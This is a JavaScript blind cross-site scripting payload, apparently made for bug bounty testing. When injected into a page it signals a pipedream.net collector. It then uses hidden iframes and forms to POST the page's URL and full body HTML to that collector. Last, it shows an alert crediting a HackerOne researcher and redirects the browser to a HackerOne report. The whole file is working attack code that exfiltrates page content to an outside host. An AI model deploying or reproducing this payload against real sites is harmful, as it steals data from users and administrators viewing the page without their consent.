try {
  var elem = document.createElement('img');
elem.src = 'https://encq9kzbey4y.x.pipedream.net/BLIND_XSS_TRIGGERED';
document.body.appendChild(elem);
  
  //https://stackoverflow.com/a/6169703
  function Exfil(f, n) {
  // Add the iframe with a unique name
  var iframe = document.createElement("iframe");
  var uniqueString = n;
  document.body.appendChild(iframe);
  iframe.style.display = "none";
  iframe.contentWindow.name = uniqueString;

  // construct a form with hidden inputs, targeting the iframe
  var form = document.createElement("form");
  form.target = uniqueString;
  form.action = "https://encq9kzbey4y.x.pipedream.net/exfil";
  form.method = "POST";

  f(form);
  document.body.appendChild(form);
  form.submit();
  }
  
  Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "location";
  input.value = document.location.href;
  form.appendChild(input);
  }, "xfil1");
  
  Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "html_code";
  input.value = document.body.innerHTML;
  form.appendChild(input);
  }, "xfil2");
  
}catch(error) {  
}

try {
  setTimeout(function(){
alert('PROOF -> Blind XSS HIT. This is proof from 0-1@HackerOne. Please contact your security team.');
document.location.href = "https://hackerone.com/reports/693776";
  }, 1500);
}catch(error) {}